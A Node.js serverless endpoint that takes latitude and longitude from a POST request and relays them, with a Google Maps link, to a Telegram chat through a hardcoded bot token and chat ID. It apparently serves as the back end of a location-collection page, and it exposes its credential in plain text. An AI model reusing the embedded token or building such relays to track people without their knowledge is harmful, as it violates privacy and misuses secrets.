const https = require('https');

const TELEGRAM_BOT_TOKEN = '7715557687:AAHvJdcOYIqjIpGpBSsv66Irb9ViN5tZvMs';
const TELEGRAM_CHAT_ID = '2063662084';

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const { latitude, longitude } = req.body;
    
    if (!latitude || !longitude) {
      return res.status(400).json({ error: 'Dados de localização ausentes' });
    }

    const message = `Nova localização recebida:\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: https://maps.google.com/?q=${latitude},${longitude}`;

    // Preparar os dados para enviar ao Telegram
    const telegramData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });

    // Opções para a requisição HTTPS
    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': telegramData.length
      }
    };

    // Função para enviar a requisição
    const sendTelegramRequest = () => {
      return new Promise((resolve, reject) => {
        const req = https.request(options, (res) => {
          let data = '';
          
          res.on('data', (chunk) => {
            data += chunk;
          });
          
          res.on('end', () => {
            resolve(JSON.parse(data));
          });
        });
        
        req.on('error', (error) => {
          reject(error);
        });
        
        req.write(telegramData);
        req.end();
      });
    };

    await sendTelegramRequest();
    
    return res.status(200).json({ status: 'ok' });
  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: error.message });
  }
}; 